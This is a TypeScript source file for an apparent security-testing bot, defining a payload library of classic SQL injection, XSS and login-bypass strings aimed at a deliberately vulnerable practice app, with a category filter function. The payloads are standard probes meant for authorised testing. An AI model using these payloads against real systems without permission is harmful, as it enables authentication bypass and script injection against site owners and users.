// Alpha Bot — payload library.
//
// A small, curated set of well-known, widely-documented security-test payloads.
// These are standard examples appropriate for a deliberately vulnerable app such
// as OWASP Juice Shop. No exotic or obscure payloads are used.
//
// Phase 2 scope: define the payloads and expose them. Result verification
// (whether a payload actually worked) is Phase 3 and intentionally absent here.

/**
 * The category a payload belongs to.
 * - `sqli`       — SQL injection.
 * - `xss`        — Cross-site scripting.
 * - `authBypass` — Authentication bypass (typically SQLi against login logic).
 */
export type PayloadCategory = "sqli" | "xss" | "authBypass";

/**
 * A single security-test payload.
 */
export interface Payload {
  /** Stable identifier, unique within the library. */
  id: string;
  /** Which vulnerability class this payload probes. */
  category: PayloadCategory;
  /** The actual string typed into a form field. */
  value: string;
  /** Human-readable description, used for logging and later reporting. */
  description: string;
}

/**
 * The full Alpha Bot payload library: standard SQLi, XSS, and auth-bypass
 * examples. Exported as a readonly array so callers cannot mutate it.
 */
export const PAYLOADS: readonly Payload[] = [
  // --- SQL injection (3) ---
  {
    id: "sqli-1",
    category: "sqli",
    value: "' OR '1'='1",
    description: "Classic always-true string condition to break out of a quoted SQL value."
  },
  {
    id: "sqli-2",
    category: "sqli",
    value: "' OR 1=1--",
    description: "Always-true numeric condition with a SQL line comment to ignore the rest of the query."
  },
  {
    id: "sqli-3",
    category: "sqli",
    value: "admin'--",
    description: "Comments out the password check after supplying a known username."
  },

  // --- Cross-site scripting (3) ---
  {
    id: "xss-1",
    category: "xss",
    value: "<script>alert(1)</script>",
    description: "Canonical reflected/stored XSS probe using an inline script tag."
  },
  {
    id: "xss-2",
    category: "xss",
    value: "<img src=x onerror=alert(1)>",
    description: "Image tag with an onerror handler that fires when the bogus source fails to load."
  },
  {
    id: "xss-3",
    category: "xss",
    value: "\"><svg onload=alert(1)>",
    description: "Attribute-breakout followed by an SVG onload handler."
  },

  // --- Authentication bypass (2) ---
  {
    id: "authbypass-1",
    category: "authBypass",
    value: "' OR 1=1--",
    description: "Login bypass: makes the WHERE clause always true and comments out the password check."
  },
  {
    id: "authbypass-2",
    category: "authBypass",
    value: "admin' OR '1'='1",
    description: "Login bypass targeting an admin account with an always-true OR condition."
  }
];

/**
 * Returns all payloads in a given category.
 *
 * @param category - The category to filter by.
 * @returns The payloads whose `category` matches.
 */
export function payloadsByCategory(category: PayloadCategory): Payload[] {
  return PAYLOADS.filter((p) => p.category === category);
}
